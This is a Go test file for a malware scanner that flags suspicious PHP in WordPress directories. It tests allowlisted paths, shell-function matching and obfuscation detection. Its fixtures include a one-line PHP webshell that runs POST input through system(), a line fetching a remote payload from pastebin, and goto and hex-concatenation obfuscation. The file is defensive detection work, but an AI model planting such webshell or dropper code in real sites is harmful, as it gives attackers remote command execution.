package checks

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- isSafePHPInWPDir -------------------------------------------------

func TestIsSafePHPInWPDirTranslation(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/languages/en_US.l10n.php", "en_US.l10n.php") {
		t.Error(".l10n.php should be safe")
	}
}

func TestIsSafePHPInWPDirIndex(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/uploads/index.php", "index.php") {
		t.Error("index.php should be safe")
	}
}

func TestIsSafePHPInWPDirLanguagesAdmin(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/languages/admin-en_US.php", "admin-en_US.php") {
		t.Error("admin-* in languages should be safe")
	}
}

func TestIsSafePHPInWPDirLanguagesLocale(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/languages/fr_FR.php", "fr_FR.php") {
		t.Error("locale.php in languages should be safe")
	}
}

func TestIsSafePHPInWPDirMuPlugin(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/mu-plugins/endurance-browser-cache.php", "endurance-browser-cache.php") {
		t.Error("endurance mu-plugin should be safe")
	}
}

func TestIsSafePHPInWPDirPluginVendor(t *testing.T) {
	if !isSafePHPInWPDir("/home/u/public_html/wp-content/plugins/myplugin/vendor/autoload.php", "autoload.php") {
		t.Error("vendor/ in plugins should be safe")
	}
}

func TestIsSafePHPInWPDirUnknown(t *testing.T) {
	if isSafePHPInWPDir("/home/u/public_html/wp-content/uploads/evil.php", "evil.php") {
		t.Error("unknown PHP in uploads should not be safe")
	}
}

// --- containsStandaloneFunc -------------------------------------------
// Tests that function-call detection distinguishes standalone calls
// from calls embedded in longer names (e.g. "doubleval(" vs "eval(").

func TestContainsStandaloneFuncAtStart(t *testing.T) {
	if !containsStandaloneFunc("base64_decode('code');", "base64_decode(") {
		t.Error("standalone call at start should match")
	}
}

func TestContainsStandaloneFuncAfterSpace(t *testing.T) {
	if !containsStandaloneFunc("return base64_decode('code');", "base64_decode(") {
		t.Error("call after space should match")
	}
}

func TestContainsStandaloneFuncEmbedded(t *testing.T) {
	if containsStandaloneFunc("my_base64_decode(x)", "base64_decode(") {
		t.Error("call inside longer name should not match")
	}
}

func TestContainsStandaloneFuncNotPresent(t *testing.T) {
	if containsStandaloneFunc("no such function here", "base64_decode(") {
		t.Error("missing function should not match")
	}
}

// --- containsAny ------------------------------------------------------

func TestContainsAnyPositive(t *testing.T) {
	strs := []string{"first line", "second line with base64"}
	if !containsAny(strs, "base64", "assert") {
		t.Error("should match base64 in second line")
	}
}

func TestContainsAnyNegative(t *testing.T) {
	strs := []string{"first line", "second line"}
	if containsAny(strs, "base64", "assert") {
		t.Error("nothing should match")
	}
}

func TestContainsAnyEmpty(t *testing.T) {
	if containsAny(nil, "base64") {
		t.Error("nil slice should not match")
	}
}

// --- countOccurrences -------------------------------------------------

func TestCountOccurrencesMultiple(t *testing.T) {
	if got := countOccurrences("abc abc abc", "abc"); got != 3 {
		t.Errorf("got %d, want 3", got)
	}
}

func TestCountOccurrencesNone(t *testing.T) {
	if got := countOccurrences("hello world", "xyz"); got != 0 {
		t.Errorf("got %d, want 0", got)
	}
}

func TestCountOccurrencesOverlapping(t *testing.T) {
	// Non-overlapping search: "aa" in "aaa" = 1 (offset advances by len(substr))
	if got := countOccurrences("aaa", "aa"); got != 1 {
		t.Errorf("got %d, want 1", got)
	}
}

// --- analyzePHPContent ------------------------------------------------

func TestAnalyzePHPContentGotoObfuscation(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "obf.php")
	// 15+ goto statements triggers "excessive goto" indicator.
	// Two indicators (goto + hex concat) triggers Critical severity.
	var gotos string
	for i := 0; i < 20; i++ {
		gotos += "goto lbl" + strings.Repeat("a", i) + "; lbl" + strings.Repeat("a", i) + ":\n"
	}
	content := "<?php\n" + gotos +
		strings.Repeat("\"\\x63\" . \"\\x75\" . ", 15) + "\"\";\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Errorf("expected non-empty check for obfuscated PHP, got %+v", result)
	}
}

func TestAnalyzePHPContentRemotePayload(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "dropper.php")
	content := "<?php\n$payload = file_get_contents('https://pastebin.com/raw/abc123');\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Errorf("expected detection for remote payload URL, got %+v", result)
	}
}

func TestAnalyzePHPContentClean(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "clean.php")
	content := "<?php\necho 'Hello World';\nfunction add($a, $b) { return $a + $b; }\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("clean PHP should not flag, got check=%q message=%q", result.check, result.message)
	}
}

func TestAnalyzePHPContentMissing(t *testing.T) {
	result := analyzePHPContent(filepath.Join(t.TempDir(), "nope.php"))
	if result.check != "" {
		t.Errorf("missing file should return empty, got check=%q", result.check)
	}
}

func TestAnalyzePHPContentEmpty(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.php")
	_ = os.WriteFile(path, []byte(""), 0644)
	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("empty file should return empty, got check=%q", result.check)
	}
}


// --- containsStandaloneFunc: method/static calls must not match --------
//
// The earlier heuristic only required the character before the call to be
// non-alphanumeric. That matched method calls like $this->DB->exec(, where
// the character before "exec(" is ">" (the arrow operator's second char).
// Dropbox's elFinder volume driver hit this: a `$this->DB->exec(SQLite stmt)`
// line that also referenced $_SERVER's REQUEST_TIME triggered the
// "shell function with request input on same line" indicator.

func TestContainsStandaloneFuncRejectsArrowMethodCall(t *testing.T) {
	if containsStandaloneFunc("$this->DB->exec(\"update ...\");", "exec(") {
		t.Error("method call via -> should not match shell function")
	}
}

func TestContainsStandaloneFuncRejectsStaticCall(t *testing.T) {
	if containsStandaloneFunc("Foo::exec($cmd);", "exec(") {
		t.Error("static call via :: should not match shell function")
	}
}

func TestContainsStandaloneFuncRejectsFunctionDeclaration(t *testing.T) {
	if containsStandaloneFunc("function exec(\"cmd\") { /* ... */ }", "exec(") {
		t.Error("function declaration should not match shell function call")
	}
}

func TestContainsStandaloneFuncRejectsTruncatedArrowAtStart(t *testing.T) {
	// absPos == 1 edge case: the match starts at byte 1 and only the
	// tail byte of a possible method/static operator is visible. We
	// cannot confirm the operator but we also cannot treat it as a
	// real call, because in any realistic 32 KB buffer slice the byte
	// could be the tail of "->" or "::" that got cut off at the start.
	if containsStandaloneFunc(">exec(", "exec(") {
		t.Error("single-byte > before exec( at absPos=1 must not match (potential truncated method call)")
	}
	if containsStandaloneFunc(":exec(", "exec(") {
		t.Error("single-byte : before exec( at absPos=1 must not match (potential truncated static call)")
	}
}

func TestContainsStandaloneFuncAcceptsBarePHPExec(t *testing.T) {
	if !containsStandaloneFunc("$r = exec(\"ls -la\");", "exec(") {
		t.Error("bare PHP exec() call must still match")
	}
	if !containsStandaloneFunc("@exec(\"ls\")", "exec(") {
		t.Error("error-suppressed @exec() must still match")
	}
}

// --- analyzePHPContent: co-presence needs corroboration ----------------
//
// Legitimate WordPress file-manager plugins (FileOrganizer/elFinder) and
// media-processing libraries legitimately call exec()/proc_open() for
// ImageMagick and also consume $_POST/$_GET for AJAX routing. The two
// tokens co-exist in the same file without being on the same line. Before
// this fix, "shell function co-present with request input" fired HIGH on
// its own, producing multi-account noise whenever the plugin was
// installed. Require at least one other indicator before emitting.

func TestAnalyzePHPContentLoneCopresenceDoesNotFire(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "legit-library.php")
	// Real PHP shell exec() on line 2 (image processing), bare $_POST
	// read on line 6 (AJAX parameter). No other indicator in the file.
	content := "<?php\n" +
		"$r = exec(\"convert \" . escapeshellarg($src) . \" -thumbnail 128x128 \" . escapeshellarg($dst));\n" +
		"\n" +
		"function route() {\n" +
		"    $cmd = isset($_POST[\"cmd\"]) ? sanitize_text_field($_POST[\"cmd\"]) : \"\";\n" +
		"    return dispatch($cmd);\n" +
		"}\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("lone shell+request co-presence should not fire, got check=%q details=%q", result.check, result.details)
	}
}

func TestAnalyzePHPContentSameLineShellRequestStillFires(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "shell-sameline.php")
	// Classic one-line webshell: exec directly takes $_POST input. This
	// must keep firing HIGH even when no other indicator is present.
	content := "<?php system($_POST[\"c\"]);\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check == "" {
		t.Fatal("same-line shell+request must still fire")
	}
	if result.check != "suspicious_php_content" {
		t.Errorf("single same-line indicator should be HIGH (suspicious_php_content), got %q", result.check)
	}
}

func TestAnalyzePHPContentCopresenceWithOtherIndicatorEscalates(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "co-plus-goto.php")
	// Co-presence alone is silent; co-presence alongside a strong obfuscation
	// signal (15+ goto statements) should escalate to Critical as two
	// indicators together.
	var gotos string
	for i := 0; i < 20; i++ {
		gotos += fmt.Sprintf("goto lbl%d; lbl%d:\n", i, i)
	}
	content := "<?php\n" + gotos +
		"$r = exec(\"somecmd\");\n" +
		"$x = $_POST[\"p\"];\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "obfuscated_php" {
		t.Errorf("co-presence + goto obfuscation should escalate to Critical, got check=%q", result.check)
	}
}

func TestAnalyzePHPContentDBMethodExecIsNotShellCall(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "sqlite-driver.php")
	// Elfinder Dropbox driver shape: $this->DB->exec(SQLite UPDATE) with
	// $_SERVER["REQUEST_TIME"] on the same line. The arrow method call
	// must not be counted as PHP's shell exec.
	content := "<?php\n" +
		"class Driver {\n" +
		"    public function flush($cursor) {\n" +
		"        $this->DB->exec(\"update tbl set mtime=\" . $_SERVER[\"REQUEST_TIME\"] . \" where id=1\");\n" +
		"    }\n" +
		"}\n"
	_ = os.WriteFile(path, []byte(content), 0644)

	result := analyzePHPContent(path)
	if result.check != "" {
		t.Errorf("$this->DB->exec + $_SERVER must not trigger shell+request, got check=%q details=%q", result.check, result.details)
	}
}
